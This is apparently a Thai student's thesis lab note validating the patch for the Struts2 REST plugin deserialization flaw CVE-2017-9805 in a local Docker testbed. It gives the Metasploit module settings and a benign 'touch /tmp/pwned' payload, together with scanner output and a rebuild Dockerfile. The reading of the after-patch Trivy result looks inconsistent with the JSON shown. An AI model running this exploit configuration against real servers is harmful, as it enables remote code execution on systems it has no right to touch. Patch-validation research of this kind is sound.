# Kalama Lab Note — CVE-2017-9805
**GUIDE-1: Exploitation-Validated Vulnerability Prioritization**
**วันที่ทดสอบ:** 2026-08-04 ถึง 2026-08-05
**ผู้ทดสอบ:** Natapat
**อาจารย์ที่ปรึกษา:** Atthapol

---

## 1. ข้อมูล CVE (จาก Trivy + Grype Scan)

| หัวข้อ | รายละเอียด |
|---|---|
| **CVE ID** | CVE-2017-9805 |
| **Vulhub path** | `struts2/s2-052` |
| **Package** | `org.apache.struts:struts2-rest-plugin` |
| **เวอร์ชันที่มีช่องโหว่** | 2.5.12 |
| **FixedVersion (Trivy)** | 2.3.34, 2.5.13 |
| **FixedVersion (Grype)** | 2.5.13 |
| **CWE** | Java Deserialization (XStream) → RCE |
| **Severity** | CRITICAL (CVSS 9.8) |

---

## 2. กลไกช่องโหว่ (Vulnerability Mechanism)

Struts2 REST plugin ใช้ **XStream** สำหรับ deserialize XML request body ใน endpoint `/orders/{id}/edit`
โดยไม่มีการ validate class whitelist — ทำให้ผู้โจมตีสามารถส่ง serialized XML gadget chain
ที่ trigger `ProcessBuilder.start()` ได้โดยตรง ไม่ต้องผ่าน authentication

**Attack Flow:**
```
Attacker
   └── POST /orders/3/edit
         Content-Type: application/xml
         Body: XStream gadget chain (ProcessBuilder)
               └── XStream.fromXML()
                     └── deserialize → ProcessBuilder.start()
                           └── touch /tmp/pwned (RCE)
```

**ข้อสังเกตสำหรับงานวิจัย:**
ช่องโหว่นี้ไม่ได้อยู่ที่ `struts2-core` แต่อยู่ที่ `struts2-rest-plugin` ซึ่งเป็น optional plugin
— เป็นตัวอย่างที่ดีของ §7.2 ใน progress note ที่ระบุว่า "artifact ที่มีช่องโหว่อาจไม่ใช่ core"

---

## 3. สภาพแวดล้อมการทดสอบ (Test Environment)

| รายการ | รายละเอียด |
|---|---|
| **Host** | distorion-HP-Pavilion-Laptop-15-eh3xxx (Ubuntu) |
| **Testbed** | Vulhub Docker environment |
| **Before-patch image** | `vulhub/struts2:2.5.12-rest-showcase` |
| **After-patch image** | `struts2-patched` (build จาก Apache archive 2.5.13) |
| **Exploit tool** | Metasploit Framework (`multi/http/struts2_rest_xstream`) |
| **Scanner** | Trivy (before + after), Grype (before) |
| **Docker network** | `s2-052_default` (172.23.0.0/16) |

**Container IPs:**
- Before-patch container: `172.23.0.2`
- MSF container (recursing_jang): `172.23.0.3`
- After-patch container (struts2-patched): `172.17.0.2`

---

## 4. Before-Patch Scan

### 4.1 Trivy Scan

```bash
trivy image -f json vulhub/struts2:2.5.12-rest-showcase
```

**ผลลัพธ์สำคัญ:**
```json
{
  "VulnerabilityID": "CVE-2017-9805",
  "FixedVersion": "2.3.34, 2.5.13",
  "pkg": "org.apache.struts:struts2-rest-plugin",
  "InstalledVersion": "2.5.12"
}
```

### 4.2 Grype Scan

```bash
grype vulhub/struts2:2.5.12-rest-showcase -o json
```

**ผลลัพธ์สำคัญ:**
```json
{
  "id": "CVE-2017-9805",
  "fixedVersion": "2.5.13",
  "pkg": "org.apache.struts:struts2-rest-plugin",
  "installed": "2.5.12"
}
```

**ตีความ:** ทั้ง Trivy และ Grype เห็น CVE เดียวกัน Grype แนะนำ 2.5.13 เพียงค่าเดียว
ส่วน Trivy ให้ 2 branch คือ 2.3.34 (สาย 2.3.x) และ 2.5.13 (สาย 2.5.x ที่ตรงกับ installed version)

---

## 5. Before-Patch Exploitation

### 5.1 Deploy Vulnerable Container

```bash
cd ~/vulhub/struts2/s2-052
docker compose up -d
```

**ผลลัพธ์:**
```
[+] up 2/2
✔ Network s2-052_default  Created
✔ Container s2-052-struts2-1  Started
```

Container IP: `172.23.0.2`, Port: `8080`

### 5.2 Setup MSF

```bash
sudo docker run --rm -it --network s2-052_default \
  metasploitframework/metasploit-framework msfconsole
```

```
use exploit/multi/http/struts2_rest_xstream
set RHOSTS 172.23.0.2
set RPORT 8080
set TARGETURI /orders/3/edit
set PAYLOAD cmd/unix/generic
set CMD touch /tmp/pwned
set LHOST 172.23.0.3
set SRVHOST 172.23.0.3
set SRVPORT 8081
```

### 5.3 รัน Exploit

```
msf exploit(multi/http/struts2_rest_xstream) > run
[*] Exploit completed, but no session was created.
```

### 5.4 ตรวจสอบผล (Oracle)

```bash
docker exec -it s2-052-struts2-1 bash
ls -la /tmp/
```

**ผลลัพธ์:**
```
-rw-r----- 1 root root  0 Aug 4 22:57 pwned
```

✅ **Exploit สำเร็จ** — `/tmp/pwned` ถูกสร้างขึ้นใน container

---

## 6. Patch Process

### 6.1 ทำไมถึง Build เอง

`vulhub/struts2:2.5.13` ไม่มีบน Docker Hub (pull ไม่ได้)
จึงใช้ `Dockerfile.struts-webapp` ที่ดาวน์โหลด struts-apps.zip จาก Apache archive โดยตรง

```
patch_swap.sh --image vulhub/struts2:2.5.13 → ❌ pull ไม่ได้
→ เปลี่ยนเป็น Build เองจาก Apache archive version 2.5.13
```

### 6.2 Dockerfile ที่ใช้

```dockerfile
ARG ST2_VERSION
ARG TOMCAT_IMAGE=tomcat:9-jre8

FROM ${TOMCAT_IMAGE}
ARG ST2_VERSION

RUN apt-get update -qq && \
    apt-get install -y --no-install-recommends wget unzip && \
    rm -rf /var/lib/apt/lists/*

RUN rm -rf /usr/local/tomcat/webapps/* && \
    wget -q \
      "https://archive.apache.org/dist/struts/${ST2_VERSION}/struts-${ST2_VERSION}-apps.zip" \
      -O /tmp/struts-apps.zip && \
    unzip -q /tmp/struts-apps.zip -d /tmp/ && \
    mv /tmp/struts-${ST2_VERSION}/apps/struts2-showcase.war \
       /usr/local/tomcat/webapps/ROOT.war && \
    rm -rf /tmp/struts*

EXPOSE 8080
```

### 6.3 Build

```bash
docker build --build-arg ST2_VERSION=2.5.13 -t struts2-patched .
```

**ผลลัพธ์:**
```
[+] Building 21.3s (7/7) FINISHED
✔ naming to docker.io/library/struts2-patched:latest
```

### 6.4 Deploy Patched Container

```bash
docker run -d -p 8080:8080 \
  --network bridge \
  --name struts2-patched \
  struts2-patched
```

Container IP: `172.17.0.2`

---

## 7. After-Patch Scan

### 7.1 Trivy Scan (After)

```bash
trivy image -f json -o 2017-9805-af.json struts2-patched
```

**ผลลัพธ์ CVE-2017-9805:**
```json
{
  "id": "CVE-2017-9805",
  "fixedVersion": null,
  "pkg": "org.apache.struts:struts2-rest-plugin",
  "InstalledVersion": "2.5.13"
}
```

**ตีความ:** `FixedVersion: null` หมายความว่า Trivy ไม่พบ CVE-2017-9805
ใน `struts2-patched` อีกต่อไป — สอดคล้องกับการอัพเกรดเป็น 2.5.13

---

## 8. After-Patch Exploitation (Re-exploit)

### 8.1 Setup MSF (ยิงซ้ำด้วย payload เดิม)

```
set RHOSTS 172.17.0.2
set LHOST 172.17.0.3
set SRVHOST 172.17.0.3
run
```

**ผลลัพธ์:**
```
[*] Exploit completed, but no session was created.
```

### 8.2 ตรวจสอบผล (Oracle)

```bash
docker exec -it struts2-patched bash
ls -la /tmp/
```

**ผลลัพธ์:**
```
drwxrwxrwt 1 root root 4096 Aug 4 01:26 .
drwxr-xr-x 1 root root 4096 Aug 4 23:45 ..
drwxr-xr-x 1 root root 4096 Aug 4 23:45 hsperfdata_root
```

❌ **Exploit ล้มเหลว** — ไม่มี `/tmp/pwned` = patch เวิร์คจริง

---

## 9. สรุปผล Pipeline (Full Loop)

| ขั้นตอน | เครื่องมือ | ผลลัพธ์ |
|---|---|---|
| **Trivy scan (before)** | Trivy | พบ CVE-2017-9805, FixedVersion=2.5.13 |
| **Grype scan (before)** | Grype | พบ CVE-2017-9805, fixed=2.5.13 |
| **Before-patch exploit** | MSF `struts2_rest_xstream` | ✅ สำเร็จ (`/tmp/pwned` ถูกสร้าง) |
| **Patch** | Build จาก Apache archive 2.5.13 | Build สำเร็จ |
| **Trivy scan (after)** | Trivy | CVE-2017-9805 FixedVersion=null = ไม่พบ |
| **After-patch re-exploit** | MSF payload เดิม | ❌ ล้มเหลว (ไม่มี `/tmp/pwned`) |

**ข้อสรุปเชิงวิจัย:**
FixedVersion ที่ Grype ระบุ (2.5.13) **ยืนยันได้จริง** ด้วยการ exploit จริง
และ Trivy after-scan ยืนยันสอดคล้องว่าไม่พบ CVE อีก — เป็น True Positive สำหรับ patch recommendation

---

## 10. ปัญหาที่พบระหว่างทาง (Lessons Learned)

| ปัญหา | สาเหตุ | วิธีแก้ |
|---|---|---|
| `vulhub/struts2:2.5.13` pull ไม่ได้ | vulhub ไม่มี tag 2.5.13 บน Docker Hub | Build เองจาก Apache archive ด้วย Dockerfile.struts-webapp |
| `unzip: not found` ตอน build | `tomcat:9-jre8` ไม่มี unzip ติดมา | เพิ่ม `apt-get install wget unzip` ใน Dockerfile |
| MSF บอก "no session was created" แม้ exploit สำเร็จ | ใช้ `cmd/unix/generic` ไม่ใช่ reverse shell | ปกติ — oracle คือ `/tmp/pwned` ไม่ใช่ session |
| Network ของ struts2-patched ต่างจาก s2-052_default | รัน container แยก network | เช็ค IP ก่อนตั้งค่า RHOSTS ใน MSF ทุกครั้ง |

---

## 11. หมายเหตุสำหรับ Thesis

- **Oracle ที่ใช้**: `/tmp/pwned` ภายใน container — ไม่ใช่ MSF session หรือ nuclei match
- **Fix type**: webapp-rebuild (ดาวน์โหลด WAR จาก Apache archive) ไม่ใช่ Maven fat-jar
  → ต้องใช้ `Dockerfile.struts-webapp` ไม่ใช่ `Dockerfile.maven-fatjar`
- **FixedVersion ต่างกันระหว่าง Trivy กับ Grype**: Trivy ให้ `2.3.34, 2.5.13` ส่วน Grype ให้ `2.5.13`
  → ใช้ "same-branch" policy เลือก 2.5.13 (ตรงกับ installed branch 2.5.x)
- **ไฟล์ที่เกี่ยวข้อง**:
  - `kalama/output/scan/before-patch/trivy/2017-9805-bf.json`
  - `kalama/output/scan/before-patch/trivy/2017-9805-af.json`

---

*Lab note นี้เป็นส่วนหนึ่งของโปรเจกต์ Kalama (GUIDE-1) ภายใต้การดูแลของ Atthapol*
